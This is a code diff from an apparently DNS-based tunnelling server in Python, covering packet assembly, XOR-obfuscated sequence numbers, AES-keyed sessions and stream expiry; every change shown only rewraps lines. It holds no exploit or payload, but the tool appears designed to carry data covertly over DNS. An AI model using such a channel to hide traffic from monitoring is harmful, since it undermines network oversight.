-        logging.debug("Packets for DNS response assembly [pre sequence numbers]: %s", packets)
+        packets = [b'%s' % response_string[i:i + data_length]
+                   for i in range(0, len(response_string), data_length)]
+        logging.debug(
+            "Packets for DNS response assembly [pre sequence numbers]: %s", packets)
 
         # Prepend sequence number (obfuscated so every address in a new response doesn't begin with 01, 02, ...)
         # Sequence number format: [packet ordinal] XOR [last byte in packet]
-        packets = [bytes.fromhex(hex(i+1 ^ packets[i][-1])[2:].rjust(2 , '0')) + packets[i] for i in range(0, len(packets))]
-        logging.debug("Packets for DNS response assembly [pre padding]: %s", packets)
+        packets = [bytes.fromhex(hex(
+            i+1 ^ packets[i][-1])[2:].rjust(2, '0')) + packets[i] for i in range(0, len(packets))]
+        logging.debug(
+            "Packets for DNS response assembly [pre padding]: %s", packets)
 
         # Ensure length of response is a multiple of 16, pad last packet with \x00
         packets[-1] = packets[-1].ljust(16, b'\x00')
@@ -1235,7 +1334,8 @@ class PacketHandler(DNSHandler):
         '''Accepts a dnslib query (from which the session is extracted), a key and an iv which are both integers.
         Returns the new session identifier (session cookie).'''
         global sessions
-        while sessions_lock.locked(): time.sleep(0.001)
+        while sessions_lock.locked():
+            time.sleep(0.001)
 
         # Associate the given AES key and IV pair with the client.
         query = str(query.qname)[:-1]
@@ -1276,7 +1376,8 @@ class PacketHandler(DNSHandler):
                         ):
                             try:
                                 del sessions[session_id]["streams"][stream_id]
-                                logging.debug('Expired stream %s for session %s deleted.', stream_id, session_id)
+                                logging.debug(
+                                    'Expired stream %s for session %s deleted.', stream_id, session_id)
                             except KeyError:
                                 # Stream was deleted already. How? Mystery!
                                 pass
@@ -1391,7 +1492,8 @@ def exit_handler(signal=None, frame=None):
         dns_server.stop()
 
     while True:
-        choice = input('Save sessions to disk before exiting? [Y/n] ').strip().lower()
+        choice = input(
+            'Save sessions to disk before exiting? [Y/n] ').strip().lower()
         if choice in ['', 'y']:
             filename = input('Filename? [%s] ' % sessions_filename).strip()
             if filename == '':
